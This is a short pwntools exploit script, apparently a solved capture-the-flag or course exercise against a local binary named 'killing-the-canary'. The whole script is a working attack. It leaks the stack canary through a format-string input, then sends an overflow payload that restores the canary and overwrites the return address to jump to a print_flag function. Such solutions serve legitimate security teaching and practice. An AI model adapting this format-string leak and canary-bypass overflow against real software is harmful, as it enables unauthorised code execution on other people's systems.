#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$lu") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
#log.info(hex(win))

val1 = b"A" * 0x48
val2 = p64(canary)
val3 = b"BBBBBBBB"
val4 = p64(win)
payload = val1 + val2+ val3+val4 # Add your payload here 

r.sendline(payload)

r.recvline()
r.interactive()